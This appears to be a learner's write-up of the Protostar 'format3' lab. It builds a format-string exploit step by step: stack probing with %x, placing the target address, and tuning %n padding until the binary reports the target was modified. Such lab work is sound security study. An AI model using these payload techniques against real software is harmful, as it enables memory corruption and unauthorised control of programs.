<h2>Goal</h2>

<h2>Process</h2>

```bash
objdump -t format3 | grep target
080496f4 g     O .bss	00000004              target
```

Let's see where we can write to memory, let's just blindly try 100  addresses.
```bash
python -c 'print "AAAAAAAA"+"%x "*100' | ./format3
AAAAAAAA0 bffff5d0 b7fd7ff4 0 0 bffff7d8 804849d bffff5d0 200 b7fd8420 bffff614 41414141 41414141 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 bfff000a b7fffbe8 e b7ea36e4 b7fe1afc f63d4e2e 0 3 b7fff8f8 0 0 1 
target is 00000000 :(
```
Ok great looks like we have it fairly early in, counting the amount of addresses, we get 12.


Using 13 too confirm, it is correct.
```bash
python -c 'print "AAAAAAAA"+"%x "*12' | ./format3
AAAAAAAA0 bffff5d0 b7fd7ff4 0 0 bffff7d8 804849d bffff5d0 200 b7fd8420 bffff614 41414141
target is 00000000 :(
```

Next let's put in our memory address for `target` and replace a `%x` with a `%n`
```bash
python -c 'print "\xf4\x96\x04\x08"+"%x "*11+"%n"' | ./format3
��0 bffff5d0 b7fd7ff4 0 0 bffff7d8 804849d bffff5d0 200 b7fd8420 bffff614 
target is 0000004c :(
```

Ok let's put in some padding like last time and start experimenting.

```bash
python -c 'print "\xf4\x96\x04\x08"+"%100x "*11+"%n"' | ./format3
target is 0000045b :(
```

Not nearly large enough, lets add some more 0's.

```bash
python -c 'print "\xf4\x96\x04\x08"+"%1000000x "*11+"%n"' | ./format3
target is 00a7d8cf :(
```
Closer, but still off. Adding another Zero push we way off and took a long time to execute. After changing the starting value from 1 to a few different numbers 2 got me close.  Now `014fb18f` is greater than the required `01025544`, but its significantly closer. Trying `1500000` got me really close.

```bash
python -c 'print "\xf4\x96\x04\x08"+"%2000000x "*11+"%n"' | ./format3
target is 014fb18f :(
```


After experimenting I eventually got this:
```bash
user@protostar:/opt/protostar/bin$ python -c 'print "\xf4\x96\x04\x08"+"%1539100x"*11+"%n"' | ./format3

target is 01025538 :(
```
Adding a 1 to the end of `"%1539100x"` pushed me over the value, this means this wouldnt not work.  I would have to write out each of the `"%x"` and start over.  This is because we are multiplying the spacing everytime by 11, so an increment of 4, to get from 5538 to 5544 wouldn't be achievable.  After a similar process with `python -c 'print "\xf4\x96\x04\x08"+"%10000000x%x%x%x%x%x%x%x%x%x%x"+"%n"' | ./format3` I eventually got the correct value.  




<h2>Solution</h2>

This ended up working for me.
```bash
python -c 'print "\xf4\x96\x04\x08"+"%16930052x%x%x%x%x%x%x%x%x%x%x"+"%n"' | ./format3
0bffff5d0b7fd7ff400bffff7d8804849dbffff5d0200b7fd8420bffff614
you have modified the target :)
```
However this seems like way to much guess work. Time to read some of the other writeup's to learn a more accurate way to do this.
